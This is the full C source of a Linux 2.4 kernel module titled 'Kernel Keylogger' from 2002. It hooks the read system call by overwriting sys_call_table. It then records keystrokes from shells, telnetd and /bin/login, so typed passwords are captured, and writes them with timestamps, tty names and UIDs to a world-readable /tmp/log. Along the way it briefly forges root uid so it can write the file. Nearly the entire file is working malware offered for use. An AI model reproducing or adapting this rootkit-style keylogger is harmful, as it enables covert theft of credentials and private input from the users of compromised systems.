/***
****              Kernel Keylogger
****    (C) 2002 by mercenary bm63p@yahoo.com
****
****  copmpile: gcc -c -O3 -Wall -I /usr/src/linux/include/ kkeylogger.c
****
****  tested only on Slack 8.0 (2.4.5)
****   
***/


#define MODULE
#define __KERNEL__


#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/config.h>
#include <linux/stddef.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/sched.h>
#include <linux/tty.h>
#include <linux/unistd.h>
#include <linux/string.h>

#include <sys/syscall.h>
#include <linux/file.h>
#include <asm/uaccess.h>

extern void 	*sys_call_table	 [];


#define LOGFILE "/tmp/log"       // Default logfile


static char 	logger_buffer    [512];

static char 	tty_name_current [16];

static char 	tty_name_prev    [16];

static char 	test_buffer      [256];

static char 	hour		 [24];

static char 	day		 [24];

static char     prev_comm        [16];

static char 	special_buffer   [2];

static char     prev_char        [2];

int    counter = 0;



int (*original_read) (unsigned int, char *, size_t);


static char *my_get_tty_name (struct tty_struct *tty, const char *name, char *buf) {

    int idx = (tty) ?MINOR (tty->device) - tty->driver.minor_start:0;


    if (!tty) 
	strcpy (buf, "NULL tty");

    else
	sprintf (buf, name, idx + tty->driver.name_base);

    return buf;
}



int write_to_logfile(char *buffer) {

    struct file   *file = NULL;
    mm_segment_t  fs;
    int 	  error,old_uid;


    old_uid = current->uid;    // if user is not root make him root
    current->uid = 0;          // so he can write to logfile
                               // coz it'll be owned by root


    file = filp_open (LOGFILE, O_CREAT|O_APPEND, 00666);

    if (IS_ERR(file)) {

	error = PTR_ERR(file);
        goto out;
    }

    error = -EACCES;

    if (!S_ISREG(file->f_dentry->d_inode->i_mode))
	goto out_err;

    error = -EIO;

    if (!file->f_op->write)
	goto out_err;

    error = 0;

    fs = get_fs ();
    set_fs (KERNEL_DS);

    file->f_op->write (file,buffer,strlen(buffer),&file->f_pos);

    set_fs (fs);
    filp_close (file,NULL);


out:
	current->uid = old_uid;    // Drop the UID
	return error;

out_err:
	filp_close (file,NULL);
	goto out;
}



int get_time (void) {

    struct file   *file = NULL;
    mm_segment_t  fs;
    int 	  error,i;


    file = filp_open ("/proc/driver/rtc", O_RDONLY, 0);

    if (IS_ERR(file)) {
    
	error = PTR_ERR(file);
        goto out;
    }

    error = -EACCES;

    if (!S_ISREG(file->f_dentry->d_inode->i_mode))
	goto out_err;

    error = -EIO;

    if (!file->f_op->write)
	error = -EACCES;

    if (!S_ISREG(file->f_dentry->d_inode->i_mode))
	goto out_err;

    error = -EIO;

    if (!file->f_op->write)
        goto out_err;


    error = 0;

    fs = get_fs ();

    set_fs (KERNEL_DS);

    file->f_op->read (file,hour,20,&file->f_pos);
    file->f_op->read (file,day,22,&file->f_pos);

    set_fs (fs);

    filp_close (file,NULL);

    hour [0] = '<';

    for (i=1;i<9;i++)
	hour [i] = hour [i+10];


    hour [9]  = '>';
    hour [10] = '\0';


    day [0] = '<';

    for (i=1;i<11;i++)
	day [i] = day [i+10];

    day [11] = '>';
    day [12] = '\0';


out:
        return error;
out_err:
        filp_close(file,NULL);
        goto out;
}




int hacked_read (unsigned int fd, char *buf, size_t count) {

    int r,i;
    

    r = original_read(fd, buf, count);


    if (counter) {


	if (counter == 2) {         // Arrows + Break

	    if (buf[0] == 0x44) {

		strcat (logger_buffer,"[Left.Arrow]");
		counter = 0;
	        goto END;
	    }

	    if (buf[0] == 0x43) {

		strcat (logger_buffer,"[Right.Arrow]");
		counter = 0;
	        goto END;
	    }

	    if (buf[0] == 0x41) {

		strcat(logger_buffer,"[Up.Arrow]");
		counter = 0;
	        goto END;
	    }

	    if (buf[0] == 0x42) {

		strcat (logger_buffer,"[Down.Arrow]");
		counter = 0;
	        goto END;
	    }

	    if (buf[0] == 0x50) {

		strcat (logger_buffer,"[Break]");
		counter = 0;
	        goto END;
	    }

	    if(buf[0] == 0x47) {

		strcat (logger_buffer,"[Middle.NumLock]");
		counter = 0;
	        goto END;
	    }

	    strncpy (special_buffer,buf,1);
	    counter ++;
	    goto END;
	}



	if (counter == 3) {   // F1-F5

	    if (buf[0] == 0x41) {

		strcat (logger_buffer,"[F1]");
                counter = 0;
	        goto END;
	    }

	    if (buf[0] == 0x42) {

		strcat (logger_buffer,"[F2]");
		counter = 0;
	        goto END;
	    }

	    if (buf[0] == 0x43) {

		strcat (logger_buffer,"[F3]");
		counter = 0;
	        goto END;
	    }

	    if (buf[0] == 0x44) {

		strcat (logger_buffer,"[F4]");
		counter = 0;
	        goto END;
	    }

	    if (buf[0] == 0x45) {

		strcat (logger_buffer,"[F5]");
		counter = 0;
	        goto END;
	    }


	    if (buf[0] == 0x7E) {     // PgUp, PgDown, Ins, ...

		if (special_buffer[0] == 0x35)
		    strcat (logger_buffer,"[PgUp]");

		if (special_buffer[0] == 0x36)
		    strcat (logger_buffer,"[PgDown]");

		if (special_buffer[0] == 0x33)
		    strcat (logger_buffer,"[Delete]");

		if (special_buffer[0] == 0x34)
		    strcat (logger_buffer,"[End]");

		if (special_buffer[0] == 0x31)
		    strcat (logger_buffer,"[Home]");

		if (special_buffer[0] == 0x32)
		    strcat (logger_buffer,"[Ins]");

		counter = 0;
	        goto END;
	    }


	    if (special_buffer[0] == 0x31) {  // F6-F8

		if (buf[0] == 0x37)
		    strcat (logger_buffer,"[F6]");

		if (buf[0] == 0x38)
		    strcat (logger_buffer,"[F7]");

                if (buf[0] == 0x39)
		    strcat (logger_buffer,"[F8]");

		counter++;
		goto END;
	    }


	    if (special_buffer[0] == 0x32) { // F6-F12

		if (buf[0] == 0x30)
		    strcat (logger_buffer,"[F9]");

		if (buf[0] == 0x31)
		    strcat (logger_buffer,"[F10]");

		if (buf[0] == 0x33)
		    strcat (logger_buffer,"[F11]");

		if (buf[0] == 0x34)
		    strcat (logger_buffer,"[F12]");

		counter++;
		goto END;
	    }


	}



	if(counter >= 4) {  //WatchDog

	    counter = 0;
	    goto END;
	}


	counter ++;
	goto END;
    }



/*
** sys_read() has read one byte from stdin or from elsewhere:
** fd == 0   --> stdin (sh, sshd)
** fd == 3   --> telnetd    
** fd == 4   --> /bin/login 
*/

    if (r == 1 && (fd == 0 || fd == 3 || fd == 4)) {
    
	if (buf[0] == 0x15) {        // Ctrl+U -> erase the whole row.

	    logger_buffer[0] = '\0';
	    goto END;
	}


	if (buf[0] == 0x09) {        // Tabulation

	    strcat(logger_buffer,"[Tab]");
	    goto END;
	}


/*
** Just in case if two different commands are trying to read 
** from the same terminal. Else you'll log the same string twice.
*/

	my_get_tty_name (current->tty,(current->tty)?current->tty->driver.name:NULL,tty_name_current);

	if ( !strcmp(tty_name_prev,tty_name_current) && strcmp (current->comm,prev_comm)
	     && buf [0] == prev_char [0])

		goto END;


        strncpy(prev_char,buf,1);
        strcpy(prev_comm,current->comm);



/* 
** User sends BackSpace, we erase the last symbol from the logger_buffer[]. 
** BackSpace is 0x7F if we're logged locally, or 0x08 if we're logged
** with ssh, telnet ... 
*/

        if (buf[0] == 0x7F || buf[0] == 0x08) {        

	    if (logger_buffer[strlen (logger_buffer) - 1] == ']') {  // Oh, the last symbol was "special"?

		for (i=2; strlen (logger_buffer); i++)               // Trying to find the other "["
		    if (logger_buffer[strlen (logger_buffer) - i] == '[') {

			logger_buffer[strlen(logger_buffer) - i] = '\0';
			break;
		    }

		goto END;
	    }


	    else {                // If it was not "special" replace it with '\0'         

		logger_buffer[strlen (logger_buffer) - 1] = '\0';
		goto END;
	    }
	}


	if (buf[0] == 0x1B) {     // user just typed a "special" symbol 

	    counter++;
	    goto END;
	}



/*
** Enter
*/

	if (buf[0] == '\r' || buf[0] == '\n') {

	    if (strcmp (tty_name_prev,tty_name_current)) {

    		strcpy  (tty_name_prev,tty_name_current);
		get_time ();
		sprintf (test_buffer,"\n--<[%s]>--  --[%s]--  --<[UID = %i]>--\n\n",tty_name_current,day,current->uid);
		write_to_logfile (test_buffer);
	    }

            strncat (logger_buffer,"\n",1);
	    get_time ();
            sprintf (test_buffer,"%s %s",hour,logger_buffer);
	    write_to_logfile (test_buffer);
	    logger_buffer[0] = '\0';
	}

	else

	    strncat (logger_buffer,buf,1);
    }


    END:  return r;

}



int init_module (void) {

    original_read = sys_call_table[ SYS_read ];
    sys_call_table[ SYS_read ] = hacked_read;
	 
    return 0;
}

void cleanup_module (void) {

    sys_call_table[ SYS_read ] = original_read;
}
